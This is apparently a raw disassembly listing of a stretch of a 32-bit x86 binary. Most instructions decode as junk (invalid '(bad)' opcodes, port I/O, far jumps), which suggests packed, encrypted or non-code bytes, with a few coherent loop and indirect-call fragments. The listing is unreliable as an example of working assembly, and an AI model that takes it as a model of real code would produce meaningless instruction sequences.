  40190e:	ror    DWORD PTR [edx],0x57
  401911:	sub    eax,0x50e985d9
  401916:	scas   al,BYTE PTR es:[edi]
  401917:	cmp    cl,BYTE PTR [eax-0x2a]
  40191a:	jmp    DWORD PTR [ebp-0x75]
  40191d:	psubd  mm5,QWORD PTR [ebx-0x3e0e3193]
  401924:	mov    ah,0xc9
  401926:	je     0x4018d3
  401928:	ins    DWORD PTR es:[edi],dx
  401929:	sbb    BYTE PTR [edi],dh
  40192b:	jmp    0x40198f
  40192d:	out    dx,al
  40192e:	(bad)  
  40192f:	mov    cl,0x7e
  401931:	nop
  401932:	outs   dx,DWORD PTR ds:[esi]
  401933:	ja     0x40194f
  401935:	mov    eax,ds:0x62e40be5
  40193a:	dec    esi
  40193b:	fidivr WORD PTR [esi]
  40193d:	inc    ebp
  40193e:	cli    
  40193f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401940:	aaa    
  401941:	sub    BYTE PTR [edi],ah
  401943:	(bad)  
  401944:	pop    ebp
  401945:	mov    dh,0xa6
  401947:	push   ecx
  401948:	cmp    eax,0xcbbf1991
  40194d:	or     al,0xfb
  40194f:	push   edi
  401950:	or     DWORD PTR [ebx+0x5e1dd370],eax
  401956:	into   
  401957:	(bad)  
  401958:	ja     0x4019d2
  40195a:	or     ecx,DWORD PTR [esi+0x10a1f667]
  401960:	scas   al,BYTE PTR es:[edi]
  401961:	jae    0x4019be
  401963:	in     eax,0xed
  401965:	adc    ah,BYTE PTR [ebp+0x6e]
  401968:	mov    ch,0xe9
  40196a:	mov    ds:0x5f66ef10,eax
  40196f:	jno    0x401967
  401971:	call   0xe584f040
  401976:	(bad)  
  401977:	icebp  
  401978:	shr    DWORD PTR [edi-0x11b4b91f],0xac
  40197f:	jl     0x4019c8
  401981:	push   cs
  401982:	imul   DWORD PTR fs:[ebx+0x4]
  401986:	xchg   ecx,eax
  401987:	into   
  401988:	sbb    DWORD PTR [esi+eax*8+0x1d],ecx
  40198c:	cmp    esp,ebp
  40198e:	icebp  
  40198f:	and    ecx,eax
  401991:	cmp    bh,BYTE PTR [edx+0x26]
  401994:	arpl   dx,bp
  401996:	mov    dl,BYTE PTR [edi-0x6ad655fa]
  40199c:	push   ecx
  40199d:	fs leave 
  40199f:	xor    bh,al
  4019a1:	std    
  4019a2:	idiv   ebx
  4019a4:	aad    0xc9
  4019a6:	xor    dx,dx
  4019a9:	push   ecx
  4019aa:	sti    
  4019ab:	add    al,0x8b
  4019ad:	add    eax,0x11ee568e
  4019b2:	push   edx
  4019b3:	les    ebx,FWORD PTR [ecx+0x58]
  4019b6:	aaa    
  4019b7:	push   ecx
  4019b8:	loopne 0x401959
  4019ba:	jmp    0x4019d6
  4019bc:	mov    BYTE PTR [esp+ecx*1-0x32],dl
  4019c0:	jmp    0x16de:0x2f819d7a
  4019c7:	nop
  4019c8:	(bad)  
  4019c9:	xor    al,0x10
  4019cb:	lds    edx,FWORD PTR [ecx]
  4019cd:	int3   
  4019ce:	cmp    BYTE PTR [edi-0x22],dh
  4019d1:	jmp    0x3599:0xd22e77c
  4019d8:	stos   DWORD PTR es:[edi],eax
  4019d9:	dec    edx
  4019da:	dec    eax
  4019db:	fldcw  WORD PTR [eax-0x1b1d9913]
  4019e1:	sbb    al,0x0
  4019e3:	or     esi,DWORD PTR [ebx-0x3087d085]
  4019e9:	repnz fldenv [edx+eiz*2-0x43193d53]
  4019f1:	nop
  4019f2:	sbb    BYTE PTR [edx-0x69],cl
  4019f5:	popa   
  4019f6:	inc    edi
  4019f7:	lds    edi,FWORD PTR [ebx-0x55b1cb38]
  4019fd:	dec    esp
  4019fe:	and    eax,0x80b0d00d
  401a03:	cmp    ebp,DWORD PTR [eax+0x429b6d04]
  401a09:	lahf   
  401a0a:	jo     0x401a88
  401a0c:	retf   0x1d9a
  401a0f:	adc    al,0x6a
  401a11:	sbb    DWORD PTR [edi],eax
  401a13:	push   0x2b6792a2
  401a18:	(bad)  
  401a19:	jecxz  0x401a20
  401a1b:	push   edi
  401a1c:	shl    BYTE PTR ds:0xf6f3869f,1
  401a22:	push   esi
  401a23:	iret   
  401a24:	loopne 0x4019e2
  401a26:	mov    bl,0xda
  401a28:	jmp    0x67af:0xc754c5d7
  401a2f:	test   eax,0xbd33bc39
  401a34:	aas    
  401a35:	mov    edi,0x91ec6e82
  401a3a:	(bad)  
  401a3b:	(bad)  
  401a3d:	and    DWORD PTR [eax-0x7a],ebx
  401a40:	dec    ecx
  401a41:	mov    eax,ds:0x31cc15da
  401a46:	sbb    DWORD PTR [ebx+0x62],0x217cc1a7
  401a4d:	pop    edi
  401a4e:	pop    ss
  401a4f:	pop    ss
  401a50:	into   
  401a51:	sub    BYTE PTR [edi-0x19ace413],ah
  401a57:	loopne 0x401a12
  401a59:	out    0x36,eax
  401a5b:	adc    al,BYTE PTR [esi-0x2433852a]
  401a61:	stc    
  401a62:	mov    eax,DWORD PTR [ebp+0x8]
  401a65:	and    DWORD PTR ds:0x43474f,0x0
  401a6f:	mov    ecx,DWORD PTR ds:0x43474f
  401a75:	inc    ecx
  401a76:	mov    DWORD PTR ds:0x43474f,ecx
  401a7c:	cmp    DWORD PTR ds:0x43474f,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x43474f,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x43474f
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x43474f,ecx
  401aae:	cmp    DWORD PTR ds:0x43474f,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0xeac0485e
  401ae8:	jb     0x401b06
  401aea:	push   edx
  401aeb:	add    al,0x7e
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401ad6
  401af3:	add    dh,BYTE PTR [edi+0x1d]
  401af6:	jo     0x401afb
  401af8:	int3   
  401af9:	xor    ebp,edi
  401afb:	inc    ebp
  401afc:	cmps   DWORD PTR ss:[si],DWORD PTR es:[di]
  401aff:	(bad)  
  401b00:	jns    0x401b54
  401b02:	add    DWORD PTR [ebx-0x79],0xffffffa8
  401b06:	stc    
  401b07:	jp     0x401b40
  401b09:	mov    cs,edi
  401b0b:	cli    
  401b0c:	xlat   BYTE PTR ds:[ebx]
  401b0d:	in     eax,0x95
  401b0f:	lea    edx,es:[edx+ecx*8]
  401b13:	test   DWORD PTR [esi],eax
  401b15:	jl     0x401aa7
  401b17:	cmovne edx,esp
  401b1a:	adc    ebx,DWORD PTR [eax]
  401b1c:	imul   eax,eax,0x82e6a0ac
  401b22:	mov    ch,0xc
  401b24:	in     eax,0xd0
  401b26:	fwait
  401b27:	push   ss
  401b28:	gs inc esp
  401b2a:	(bad)  
  401b2b:	mov    ebx,0x8c9b9a56
  401b30:	rcl    DWORD PTR [edi+0x5ff842fb],cl
  401b36:	into   
  401b37:	inc    eax
  401b38:	cdq    
  401b39:	mov    gs,WORD PTR [edx-0x7f1fb306]
  401b3f:	jo     0x401bb8
  401b41:	adc    esp,0xffffff8a
  401b44:	lds    eax,FWORD PTR [ecx]
  401b46:	and    ecx,DWORD PTR [eax]
  401b48:	sbb    cl,BYTE PTR [esi+0x5f]
  401b4b:	fild   DWORD PTR [esi+0x1bef1bef]
  401b51:	sbb    DWORD PTR [esp+esi*1-0x11497289],esp
  401b58:	sbb    eax,DWORD PTR [esi-0x49]
  401b5b:	add    DWORD PTR [edx+eiz*2-0x6e],edi
  401b5f:	mov    ds:0x2f17356b,eax
  401b64:	cmp    BYTE PTR [eax],dl
  401b66:	(bad)  
  401b67:	mov    esi,?
  401b69:	xlat   BYTE PTR ds:[ebx]
  401b6a:	jnp    0x401ba6
  401b6c:	in     eax,0xd2
  401b6e:	pop    esi
  401b6f:	ds ret 
  401b71:	mov    ds:0x67a6aeb1,eax
  401b76:	xor    DWORD PTR ds:0xe60de427,ebx
  401b7c:	lock pop esi
  401b7e:	mov    edx,DWORD PTR [esi]
  401b80:	pop    ebp
  401b81:	call   0xbd963fcc
  401b86:	mov    al,BYTE PTR [ecx+0x14d3deb1]
  401b8c:	mov    ch,0x1e
  401b8e:	push   ebp
  401b8f:	inc    esi
  401b90:	sub    ebp,0x21c22ac0
  401b96:	mov    ds:0x33e5411,al
  401b9b:	out    0x95,eax
  401b9d:	jo     0x401b38
  401b9f:	ficomp DWORD PTR [esi+ebx*8-0x67d39018]
  401ba6:	nop
  401ba7:	call   FWORD PTR ds:0xfa9ddbbf
  401bad:	ins    DWORD PTR es:[edi],dx
  401bae:	push   ebp
  401baf:	mov    edi,0x637e9dc0
  401bb4:	push   ecx
  401bb5:	test   DWORD PTR [esi+ebx*8+0x24],edx
  401bb9:	add    DWORD PTR [eax],eax
  401bbb:	outs   dx,DWORD PTR ds:[esi]
  401bbc:	fidivr DWORD PTR [edx-0x7e31e30d]
  401bc2:	outs   dx,DWORD PTR ds:[esi]
  401bc3:	adc    al,0x95
  401bc5:	jae    0x401b8d
  401bc7:	fild   WORD PTR [ebx]
  401bc9:	cmp    BYTE PTR [ecx],0x7f
  401bcc:	push   es
  401bcd:	fadd   QWORD PTR [ebp-0x4b]
  401bd0:	scas   al,BYTE PTR es:[edi]
  401bd1:	mov    eax,ds:0xa6c0a81b
  401bd6:	jno    0x401b9a
  401bd8:	cmp    eax,0xc1ddbc4
  401bdd:	popa   
  401bde:	mov    dh,0xb0
  401be0:	inc    ebp
  401be1:	je     0x401bf5
  401be3:	in     eax,0x3d
  401be5:	in     al,0xc2
  401be7:	not    DWORD PTR [esi+0x6f]
  401bea:	adc    ebp,edx
  401bec:	pop    ebp
  401bed:	pop    esp
  401bee:	mov    esp,0x1101fbbf
  401bf3:	dec    esp
  401bf4:	mov    al,BYTE PTR [esi-0x4eeea833]
  401bfa:	and    BYTE PTR [esp+esi*1-0x30],cl
  401bfe:	pop    eax
  401bff:	jns    0x401c3c
  401c01:	inc    esp
  401c02:	adc    DWORD PTR [ebp+ebx*2-0x6a9a3caf],0xa69444f2
  401c0d:	fwait
  401c0e:	xchg   esp,eax
  401c0f:	add    dl,cl
  401c11:	les    esp,FWORD PTR [eax]
  401c13:	inc    ecx
  401c14:	mov    ds:0x3d7f28c,eax
  401c19:	sbb    BYTE PTR [ebp+0x7f],bl
  401c1c:	mul    DWORD PTR [edi]
  401c1e:	das    
  401c1f:	retf   0x865f
  401c22:	(bad)  
  401c23:	pop    esi
  401c24:	inc    esp
  401c25:	cs and eax,0xe0d64154
  401c2b:	cmp    BYTE PTR [esp+ecx*2-0x37],0x24
  401c30:	stos   DWORD PTR es:[edi],eax
  401c31:	dec    esi
  401c32:	lods   al,BYTE PTR ds:[esi]
  401c33:	jle    0x401c28
  401c35:	(bad)  
  401c37:	adc    eax,0x1320a15b
  401c3c:	and    ch,dh
  401c3e:	xchg   edx,eax
  401c3f:	test   ebp,ebx
  401c41:	ins    BYTE PTR es:[edi],dx
  401c42:	les    ecx,FWORD PTR [edx]
  401c44:	lds    ebx,FWORD PTR [edi-0x39]
  401c47:	icebp  
  401c48:	pop    es
  401c49:	out    dx,eax
  401c4a:	fild   QWORD PTR [ecx+0x27ae6b1b]
  401c50:	jne    0x401c37
  401c52:	push   ds
  401c53:	push   esp
  401c54:	pop    eax
  401c55:	xchg   ebx,eax
  401c56:	xlat   BYTE PTR ds:[ebx]
  401c57:	inc    ebx
  401c58:	jge    0x401c03
  401c5a:	mov    BYTE PTR [eax+eiz*4],0xf4
  401c5e:	push   ebp
  401c5f:	scas   eax,DWORD PTR es:[edi]
  401c60:	sbb    bh,BYTE PTR [edi-0x1]
  401c63:	mov    cl,0x79
  401c65:	xor    al,0x24
  401c67:	jns    0x401c91
  401c69:	dec    esi
  401c6a:	stc    
  401c6b:	push   esp
  401c6c:	mov    ds:0x32073f66,eax
  401c71:	in     eax,dx
  401c72:	xchg   ebx,eax
  401c73:	(bad)  
  401c74:	in     eax,dx
  401c75:	scas   eax,DWORD PTR es:[edi]
  401c76:	fs mov edi,0x2ddffc0b
  401c7c:	ins    BYTE PTR es:[edi],dx
  401c7d:	daa    
  401c7e:	int3   
  401c7f:	loopne 0x401cfa
  401c81:	mov    ds:0x5964b5e1,eax
  401c86:	adc    esp,DWORD PTR [ecx]
  401c88:	sbb    BYTE PTR [ebp-0x43],bh
  401c8b:	test   BYTE PTR [ecx+0x54],ch
  401c8e:	push   eax
  401c8f:	in     al,dx
  401c90:	mov    dl,0xfb
  401c92:	stos   DWORD PTR es:[edi],eax
  401c93:	lods   al,BYTE PTR ds:[esi]
  401c94:	inc    eax
  401c95:	in     al,dx
  401c96:	cmp    al,0xef
  401c98:	call   0xa687:0x17e2b0b1
  401c9f:	and    al,0xc4
  401ca1:	int    0x59
  401ca3:	and    cl,ah
  401ca5:	jl     0x401ce4
  401ca7:	jmp    0x41:0x4bd2a114
  401cae:	mov    eax,DWORD PTR [eax]
  401cb0:	mov    cx,WORD PTR [ebp-0x4]
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	inc    ebp
  401ccb:	sbb    DWORD PTR [ecx+eax*1+0x7e7e0689],edi
  401cd2:	mov    ch,0x7f
  401cd4:	jle    0x401d54
  401cd6:	neg    BYTE PTR [eax+0x63]
  401cd9:	dec    ebx
  401cda:	sahf   
  401cdb:	stos   BYTE PTR es:[edi],al
  401cdc:	dec    eax
  401cdd:	jno    0x401d59
  401cdf:	mov    ah,0x20
  401ce1:	dec    esi
  401ce2:	mov    ebx,0x3411cf24
  401ce7:	pop    edi
  401ce8:	les    edx,FWORD PTR [edi-0x4fa571ab]
  401cee:	xchg   dh,ah
  401cf0:	aam    0x9b
  401cf2:	test   eax,0xcb1a73e
  401cf7:	pop    edx
  401cf8:	cmp    ch,BYTE PTR [esi]
  401cfa:	push   esi
  401cfb:	bound  ecx,QWORD PTR [bx+si-0x35]
  401cff:	push   ebp
  401d00:	(bad)  
  401d01:	mov    bl,0x7a
  401d03:	icebp  
  401d04:	cmp    al,cl
  401d06:	inc    edx
  401d07:	call   0x6a7b:0x3729b9b3
  401d0e:	inc    ebx
  401d0f:	jecxz  0x401cd9
  401d11:	mov    DWORD PTR ds:0x5decbd58,edx
  401d17:	push   esp
  401d18:	stc    
  401d19:	pop    eax
  401d1a:	inc    ebx
  401d1b:	retf   0x6a30
  401d1e:	fmul   DWORD PTR [edi]
  401d20:	out    dx,eax
  401d21:	or     al,0x25
  401d23:	stc    
  401d24:	inc    esi
  401d25:	out    dx,al
  401d26:	ret    0x9c2e
  401d29:	add    DWORD PTR [edx+0x37],edx
  401d2c:	stc    
  401d2d:	mov    ah,0x79
  401d2f:	aam    0xff
  401d31:	pop    ss
  401d32:	add    al,0x27
  401d34:	sub    DWORD PTR [edi+0x7ca69287],ebx
  401d3a:	mov    eax,0xaaf31b18
  401d3f:	pop    ebp
  401d40:	aam    0x50
  401d42:	jp     0x401d2b
  401d44:	sub    DWORD PTR [esi-0x7c4e8c1b],esi
  401d4a:	int    0xd2
  401d4c:	xor    BYTE PTR [esi],al
  401d4e:	enter  0xdbef,0x85
  401d52:	popf   
  401d53:	cmp    ch,BYTE PTR [ebp-0x53]
  401d56:	mov    ah,0x3b
  401d58:	repz push es
  401d5a:	es mov es,ebx
  401d5d:	push   cs
  401d5e:	sub    DWORD PTR [esi+esi*2+0x3ed7dc86],ebp
  401d65:	test   BYTE PTR [esi-0x6efc6efc],0x3
  401d6c:	aad    0x21
  401d6e:	ins    BYTE PTR es:[edi],dx
  401d6f:	mov    bh,0xd5
  401d71:	loopne 0x401d27
  401d73:	nop
  401d74:	lods   eax,DWORD PTR ds:[esi]
  401d75:	fsub   st,st(3)
  401d77:	add    eax,0x55532551
  401d7c:	int    0xc3
  401d7e:	(bad)  
  401d7f:	push   ds
  401d80:	popa   
  401d81:	xchg   ecx,eax
  401d82:	out    dx,al
  401d83:	xor    DWORD PTR [eax-0x88ad89f],edx
  401d89:	or     al,0xdf
  401d8b:	jb     0x401d3b
  401d8d:	mov    ebp,0x1385e147
  401d92:	fdivrp st(2),st
  401d94:	stos   DWORD PTR es:[edi],eax
  401d95:	mov    ebx,0x81efe995
  401d9a:	adc    cl,BYTE PTR [edi+0x58]
  401d9d:	jl     0x401de5
  401d9f:	mov    ds:0x4be6a924,eax
  401da4:	sbb    BYTE PTR [esi+esi*4],0x3c
  401da8:	mov    ecx,0x6ac55731
  401dad:	mov    ah,0xe5
  401daf:	pop    ds
  401db0:	jmp    0x43bfeb44
  401db5:	je     0x401db5
  401db7:	mov    ss,WORD PTR [ebp+0x51]
  401dba:	inc    edx
  401dbb:	pop    esi
  401dbc:	nop
  401dbd:	jp     0x401dbc
  401dbf:	retf   0xf8de
  401dc2:	scas   eax,DWORD PTR es:[edi]
  401dc3:	pop    ebp
  401dc4:	cmp    edx,DWORD PTR [ecx+0x6b521717]
  401dca:	xchg   DWORD PTR [ebp-0x4e],ebp
  401dcd:	repnz inc eax
  401dcf:	or     DWORD PTR [esi+0x24],ecx
  401dd2:	xor    cl,bh
  401dd4:	arpl   ax,si
  401dd6:	sbb    BYTE PTR [esi],0xf
  401dd9:	std    
  401dda:	jmp    0x401d66
  401ddc:	mov    bh,0x4b
  401dde:	out    dx,eax
  401ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401de0:	sbb    eax,0x49d84601
  401de5:	enter  0x5d90,0xd9
  401de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401dea:	sbb    al,0x1f
  401dec:	leave  
  401ded:	push   esi
  401dee:	lock and BYTE PTR [ecx-0x9ad7bd2],bl
  401df5:	and    bh,0x6e
  401df8:	aad    0x7f
  401dfa:	add    DWORD PTR [edi+0x1c],esi
  401dfd:	ret    0xab9d
  401e00:	pop    es
  401e01:	mov    ah,0xad
  401e03:	inc    ebx
  401e04:	in     eax,0x1f
  401e06:	outs   dx,BYTE PTR ds:[esi]
  401e07:	fcomp  DWORD PTR [edx-0x16]
  401e0a:	adc    BYTE PTR [ebp+0x78],0xf6
  401e0e:	out    0x42,eax
  401e10:	daa    
  401e11:	xchg   BYTE PTR [ecx+0x19ee19b9],ah
  401e17:	cwde   
  401e18:	fwait
  401e19:	push   ds
  401e1a:	xlat   BYTE PTR ds:[ebx]
  401e1b:	push   eax
  401e1c:	jg     0x401e76
  401e1e:	sahf   
  401e1f:	jnp    0x401e78
  401e21:	mov    dl,0x86
  401e23:	xchg   edx,edx
  401e25:	retf   
  401e26:	jne    0x401e48
  401e28:	inc    ecx
  401e29:	mov    edi,0xade4eeab
  401e2e:	sbb    BYTE PTR [eax+0x6b3b3497],dh
  401e34:	bound  eax,QWORD PTR [ecx+0x6c]
  401e37:	or     eax,0xfaae1b73
  401e3c:	xor    DWORD PTR [edi+esi*2],esp
  401e3f:	cld    
  401e40:	lock aad 0x47
  401e43:	adc    eax,0x4b822a04
  401e48:	or     BYTE PTR [edi-0xa],dh
  401e4b:	mov    DWORD PTR [ebx-0x67],eax
  401e4e:	cmp    al,0x3f
  401e50:	add    eax,0xa8290a32
  401e55:	and    eax,0x82d006d4
  401e5a:	sbb    DWORD PTR [esi+0x20],ecx
  401e5d:	test   al,0x4
  401e5f:	push   eax
  401e60:	pop    ebx
  401e61:	mov    al,0xda
  401e63:	xchg   ebp,eax
  401e64:	cwde   
  401e65:	mov    DWORD PTR [ebx-0x2a],ecx
  401e68:	mov    al,0xe
  401e6a:	sbb    dh,bh
  401e6c:	retf   
  401e6d:	mov    ah,0x94
  401e6f:	aad    0x49
  401e71:	das    
  401e72:	pop    edx
  401e73:	test   ah,ah
  401e75:	test   eax,0xc33ef9b2
  401e7a:	loope  0x401ef6
  401e7c:	or     edi,DWORD PTR [ecx]
  401e7e:	cmp    BYTE PTR [edx+edx*1-0x10996ef7],ah
  401e85:	mov    fs,WORD PTR ss:[ebp-0x1c]
  401e89:	dec    esi
  401e8a:	xor    eax,0x4d89cbab
  401e8f:	call   0x8b4c641f
  401e94:	dec    ebp
  401e95:	or     al,0x33
  401e97:	mov    BYTE PTR [ebx],0xc0
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eb0:	test   al,0xa0
  401eb2:	lods   al,BYTE PTR ds:[esi]
  401eb3:	rol    BYTE PTR [eax],0x7e
  401eb6:	jle    0x401e6d
  401eb8:	jg     0x401f38
  401eba:	jle    0x401f0d
  401ebc:	dec    edi
  401ebd:	inc    edx
  401ebe:	or     ebp,DWORD PTR [esi]
  401ec0:	jns    0x401ec3
  401ec2:	jnp    0x401ee5
  401ec4:	dec    edx
  401ec5:	cmp    eax,0xfd7b0fd8
  401eca:	fs fcmovnb st,st(6)
  401ecd:	lds    ebx,FWORD PTR [ecx+esi*2]
  401ed0:	arpl   WORD PTR [edx-0x71bf226d],sp
  401ed6:	(bad)  
  401ed7:	imul   esi,DWORD PTR [ebp+0x232c6374],0x52
  401ede:	mul    BYTE PTR [edx]
  401ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ee1:	rdtsc  
  401ee3:	inc    ebx
  401ee4:	mov    edx,0x8b490abc
  401ee9:	sbb    eax,0x8edcacd8
  401eee:	sbb    al,0x39
  401ef0:	push   cs
  401ef1:	sahf   
  401ef2:	pop    ebp
  401ef3:	push   0x40447bcf
  401ef8:	pop    ss
  401ef9:	mov    dh,0xf0
  401efb:	nop
  401efc:	adc    DWORD PTR [edx+eiz*2-0x426b4f45],esp
  401f03:	mov    DWORD PTR [esi+0x23],ecx
  401f06:	sbb    DWORD PTR cs:[ebx],eax
  401f09:	les    esi,FWORD PTR [ebx-0x36]
  401f0c:	test   DWORD PTR [ecx+0x51],0x320bfdf2
  401f13:	dec    esp
  401f14:	data16 mov dh,0xfd
  401f17:	sbb    DWORD PTR [ebx],ebx
  401f19:	ja     0x401f5c
  401f1b:	or     BYTE PTR [ebx+0x580a3d7e],dh
  401f21:	fnsave [edi+0x2941659c]
  401f27:	adc    DWORD PTR [edx+eiz*8+0x41],eax
  401f2b:	inc    esp
  401f2c:	ror    DWORD PTR [edx],0x1a
  401f2f:	cmp    al,0x37
  401f31:	mov    edi,0x81381e56
  401f36:	out    0xe4,al
  401f38:	cmp    al,0x29
  401f3a:	adc    edx,DWORD PTR [ebx-0x620a4f73]
  401f40:	dec    eax
  401f41:	and    al,0x8f
  401f43:	repz inc eax
  401f45:	popf   
  401f46:	lods   eax,DWORD PTR ds:[esi]
  401f47:	cmp    DWORD PTR [eax+0x23],ebp
  401f4a:	les    ebp,FWORD PTR [esi-0x4b]
  401f4d:	sub    esi,DWORD PTR [eax]
  401f4f:	scas   al,BYTE PTR es:[edi]
  401f50:	aas    
  401f51:	ss push cs
  401f53:	retf   0x7b44
  401f56:	lds    esi,FWORD PTR [eax-0x10]
  401f59:	je     0x401f34
  401f5b:	aaa    
  401f5c:	cmc    
  401f5d:	jg     0x401f76
  401f5f:	outs   dx,BYTE PTR ds:[esi]
  401f60:	xor    esp,DWORD PTR [eax]
  401f62:	ss inc ebp
  401f64:	addr16 sbb eax,0x9fba04c3
  401f6a:	xchg   DWORD PTR [eax+edx*4-0x56],ebx
  401f6e:	dec    ebp
  401f6f:	cli    
  401f70:	and    ebp,DWORD PTR [ebp+0x3b]
  401f73:	inc    ebx
  401f74:	adc    al,0xec
  401f76:	out    0x52,al
  401f78:	cdq    
  401f79:	mov    dl,0xf8
  401f7b:	mov    eax,ds:0x48530e1
  401f80:	pop    eax
  401f81:	inc    ebx
  401f82:	fld    QWORD PTR [ecx-0x67]
  401f85:	cmp    DWORD PTR [ebp+ebp*1+0x5fe1a6da],ecx
  401f8c:	sbb    DWORD PTR [edx-0x7b],esp
  401f8f:	mul    BYTE PTR [edi+ecx*2-0x22]
  401f93:	jne    0x401f7a
  401f95:	hlt    
  401f96:	(bad)  
  401f97:	leave  
  401f98:	jge    0x401fbb
  401f9a:	lods   eax,DWORD PTR ds:[esi]
  401f9b:	fs in  eax,dx
  401f9d:	mov    ebp,0x988a3c14
  401fa2:	add    bh,BYTE PTR [edi+esi*1-0x5c]
  401fa6:	add    bh,bl
  401fa8:	push   0xffffff90
  401faa:	sbb    al,BYTE PTR [ebp-0x64bf9d69]
  401fb0:	cld    
  401fb1:	dec    eax
  401fb2:	scas   al,BYTE PTR es:[edi]
  401fb3:	xlat   BYTE PTR ds:[ebx]
  401fb4:	adc    esp,DWORD PTR [edx-0x3177e655]
  401fba:	cdq    
  401fbb:	and    ebx,eax
  401fbd:	fdiv   DWORD PTR ds:0x1a68cdf9
  401fc3:	shr    BYTE PTR [esp+edx*4],cl
  401fc6:	mov    ebp,0x96a610eb
  401fcb:	test   eax,0xd9a0be2e
  401fd0:	fisttp QWORD PTR [ebx]
  401fd2:	jmp    0x820:0xa4f8fd75
  401fd9:	das    
  401fda:	push   es
  401fdb:	in     al,dx
  401fdc:	sahf   
  401fdd:	sub    DWORD PTR [eax-0x543cae1a],0x21
  401fe4:	pop    ds
  401fe5:	jb     0x401f85
  401fe7:	fisttp QWORD PTR [ebx]
  401fe9:	(bad)  
  401fea:	sbb    ebp,ebx
  401fec:	mov    ah,0x5f
  401fee:	mov    esi,0x3250e073
  401ff3:	xchg   esp,eax
  401ff4:	push   esp
  401ff5:	aas    
  401ff6:	lods   eax,DWORD PTR ds:[esi]
  401ff7:	add    eax,0xc2128acc
  401ffc:	push   ebx
  401ffd:	in     al,dx
  401ffe:	test   al,0xd
  402000:	arpl   WORD PTR [ebx-0xe],si
  402003:	mov    eax,0x868420a1
  402008:	jecxz  0x401fea
  40200a:	loopne 0x401fc3
  40200c:	fwait
  40200d:	mov    esi,0x142e4ddd
  402012:	mov    dh,0xf2
  402014:	push   0x95cae788
  402019:	add    al,dl
  40201b:	push   ss
  40201c:	inc    esp
  40201d:	push   ss
  40201e:	jno    0x402027
  402020:	jle    0x401ff8
  402022:	xchg   esi,eax
  402023:	mov    eax,ds:0x40f4b2f7
  402028:	das    
  402029:	adc    cl,bl
  40202b:	clc    
  40202c:	fisttp QWORD PTR [ecx]
  40202e:	cmp    eax,0x2044eca
  402033:	push   ds
  402034:	xchg   esi,eax
  402035:	push   DWORD PTR [edi+0x74]
  402038:	push   esi
  402039:	scas   eax,DWORD PTR es:[edi]
  40203a:	sub    BYTE PTR [edx+0x7ddf7931],ah
  402040:	clc    
  402041:	pop    DWORD PTR [ebx-0x36]
  402044:	lods   eax,DWORD PTR ds:[esi]
  402045:	out    0x7a,al
  402047:	fistp  QWORD PTR [ebp-0x55]
  40204a:	push   es
  40204b:	(bad)  
  40204c:	(bad)  
  40204d:	cli    
  40204e:	push   esp
  40204f:	dec    esp
  402050:	add    ecx,edi
  402052:	push   ebp
  402053:	imul   ebx,DWORD PTR [ecx],0xffffff80
  402056:	sub    al,0x93
  402058:	add    edx,DWORD PTR [edx+0x5e988bc8]
  40205e:	fs js  0x402071
  402061:	jns    0x40202e
  402063:	test   al,0xa9
  402065:	jp     0x402083
  402067:	(bad)  
  402068:	mov    esi,0xe291a500
  40206d:	data16 mov ch,0x52
  402070:	inc    ecx
  402071:	(bad)  [esi-0x75]
  402074:	inc    ebp
  402075:	cld    
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [edx+0x28],ebp
  4020a3:	pop    ss
  4020a4:	icebp  
  4020a5:	jg     0x4020a9
  4020a7:	jle    0x402127
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	sar    DWORD PTR [eax+0x55],1
  4020b0:	aaa    
  4020b1:	ret    0x7efb
  4020b4:	mov    ch,0x1d
  4020b6:	leave  
  4020b7:	jnp    0x4020ce
  4020b9:	jno    0x402122
  4020bb:	stos   BYTE PTR es:[edi],al
  4020bc:	mov    al,ds:0x29645339
  4020c1:	mov    eax,0x611eaf46
  4020c6:	loopne 0x4020f1
  4020c8:	inc    ecx
  4020c9:	sti    
  4020ca:	int    0x69
  4020cc:	push   es
